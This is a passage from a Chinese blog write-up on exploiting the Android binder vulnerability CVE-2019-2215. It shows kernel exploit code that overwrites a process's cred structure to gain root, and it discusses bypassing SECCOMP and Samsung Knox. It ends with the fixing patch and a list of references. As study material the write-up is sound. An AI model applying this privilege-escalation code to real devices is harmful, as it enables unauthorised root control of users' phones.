    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, sgid)), GLOBAL_ROOT_GID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, euid)), GLOBAL_ROOT_UID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, egid)), GLOBAL_ROOT_GID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, fsuid)), GLOBAL_ROOT_UID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, fsgid)), GLOBAL_ROOT_GID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, securebits)), SECUREBITS_DEFAULT);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_inheritable)), CAP_EMPTY_SET);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_permitted)), CAP_FULL_SET);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_effective)), CAP_FULL_SET);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_bset)), CAP_FULL_SET);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_ambient)), CAP_EMPTY_SET);
</code></pre></div><p>前面已经泄露出了task_struct-&gt;cred的地址，这里就只用将事先准备好的cred结构体写入即可</p>
<p>最后执行<code>system(&quot;/bin/sh&quot;);</code>、<code>execve(&quot;/system/bin/sh&quot;);</code>即可获得root权限。</p>
<p><img src="img/image-20200629174038205.png" alt="image-20200629174038205"></p>
<h4 id="disabling-seccomp">Disabling SECCOMP</h4>
<p>额外的如果想要将提权程序捆绑到app上的还需要这一步，Android8开始，所有 Android 软件都使用系统调用与 Linux 内核进行通信，SECCOMP过滤器会检测所有的非法调用。SECCOMP过滤器是放在zygote 进程中，而所有的Android应用程序都是该进程fork出来的，按理所以会影响到所有的应用，但是Android安全团队进行了部分筛选，只会阻止某些系统调用。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> seccomp {
	<span style="color:#66d9ef">int</span> mode;
	<span style="color:#66d9ef">struct</span> seccomp_filter <span style="color:#f92672">*</span>filter;
};
</code></pre></div><p>想要禁用SECCOMP，直接将mode改为0是导致内核崩溃，需要清除TIF_SECCOMP 标志。<a href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/">这篇文章</a>实现了绕过，感兴趣可以看一看。</p>
<p>对于三星的设备，还需要绕过Knox/RKP才行。对于如何绕过，最近有人公开了s8相关的<a href="https://github.com/chompie1337/s8_2019_2215_poc">利用代码</a>，感兴趣可以看看。</p>
<h4 id="patch">patch</h4>
<p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b">patch</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>drivers<span style="color:#f92672">/</span>android<span style="color:#f92672">/</span>binder.c b<span style="color:#f92672">/</span>drivers<span style="color:#f92672">/</span>android<span style="color:#f92672">/</span>binder.c
index a340766b51fe.<span style="color:#ae81ff">.2</span>ef8bd29e188 <span style="color:#ae81ff">100644</span>
<span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>drivers<span style="color:#f92672">/</span>android<span style="color:#f92672">/</span>binder.c
<span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>drivers<span style="color:#f92672">/</span>android<span style="color:#f92672">/</span>binder.c
<span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4302</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">4302</span>,<span style="color:#ae81ff">18</span> <span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> binder_thread_release(<span style="color:#66d9ef">struct</span> binder_proc <span style="color:#f92672">*</span>proc,
 		<span style="color:#66d9ef">if</span> (t)
 			spin_lock(<span style="color:#f92672">&amp;</span>t<span style="color:#f92672">-&gt;</span>lock);
 	}
<span style="color:#f92672">+</span>
<span style="color:#f92672">+</span>	<span style="color:#75715e">/*
</span><span style="color:#75715e">+	 * If this thread used poll, make sure we remove the waitqueue
</span><span style="color:#75715e">+	 * from any epoll data structures holding it with POLLFREE.
</span><span style="color:#75715e">+	 * waitqueue_active() is safe to use here because we&#39;re holding
</span><span style="color:#75715e">+	 * the inner lock.
</span><span style="color:#75715e">+	 */</span>
<span style="color:#f92672">+</span>	<span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>looper <span style="color:#f92672">&amp;</span> BINDER_LOOPER_STATE_POLL) <span style="color:#f92672">&amp;&amp;</span>
<span style="color:#f92672">+</span>	    waitqueue_active(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>wait)) {
<span style="color:#f92672">+</span>		wake_up_poll(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>wait, POLLHUP <span style="color:#f92672">|</span> POLLFREE);
<span style="color:#f92672">+</span>	}
<span style="color:#f92672">+</span>
 	binder_inner_proc_unlock(<span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>proc);
 
 	<span style="color:#66d9ef">if</span> (send_reply)
</code></pre></div><p>在binder_thread free之前清理掉thread-&gt;wait即可。</p>
<h3 id="总结">总结</h3>
<p>去年出的经典的提权漏洞，这个漏洞当做提权入门也还不错，可以学习到一个完整的提权流程和几个常见方法。</p>
<p>后续真机测试过程中手上没pixel2 只能在pixel的3.18上测试，得注意先测试再使用网上的exp。然后就是适配的话主要是对于一些偏移的适配，以及不是所有的设备能都直接利用，不同内核版本和不同产商又不一样。</p>
<p>提权过程中最主要注意的就是不让内核发生奇奇怪怪的奔溃，每次遇到奔溃，可能就需要想其他的方法去绕过。</p>
<p>关于这个漏洞还有很多其他思路可以尝试，比如人造页表镜像攻击之类的方式。</p>
<h4 id="参考">参考</h4>
<ul>
<li><a href="https://www.52pojie.cn/thread-1083552-1-1.html">https://www.52pojie.cn/thread-1083552-1-1.html</a></li>
<li><a href="https://blog.csdn.net/weixin_43901866/article/details/102458212">https://blog.csdn.net/weixin_43901866/article/details/102458212</a></li>
<li><a href="https://cloudfuzz.github.io/android-kernel-exploitation/">https://cloudfuzz.github.io/android-kernel-exploitation/</a></li>
<li><a href="https://github.com/sharif-dev/AndroidKernelVulnerability">https://github.com/sharif-dev/AndroidKernelVulnerability</a></li>
<li><a href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/">https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/</a></li>
<li><a href="https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/">https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/</a></li>
</ul>

            </div>
        </article>

        <hr />

        <div class="post-info">
                <p>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://kuekiko.top/tags/cve">CVE</a></span><span class="tag"><a href="https://kuekiko.top/tags/android%E6%8F%90%E6%9D%83">Android提权</a></span>
                </p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2333 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-06-30 01:15 &#43;0800</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h"></span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    
                        <span class="button previous">
                            <a href="https://kuekiko.top/posts/2020/07/wsl2%E5%BC%80%E5%90%AFkvm/">
                                <span class="button__icon">←</span>
                                <span class="button__text">WSL2开启kvm</span>
                            </a>
                        </span>
                    

                    
                        <span class="button next">
                            <a href="https://kuekiko.top/posts/2020/04/unicorn%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/">
                                <span class="button__text">Unicorn简单学习使用记录</span>
                                <span class="button__icon">→</span>
                            </a>
                        </span>
                    
                </div>
            </div>
        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            
                <span><a href="https://kuekiko.top">Kuekiko</a></span>
            
            
                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            
            <span> <a href="https://kuekiko.top/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="https://kuekiko.top/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>



    </body>
</html>
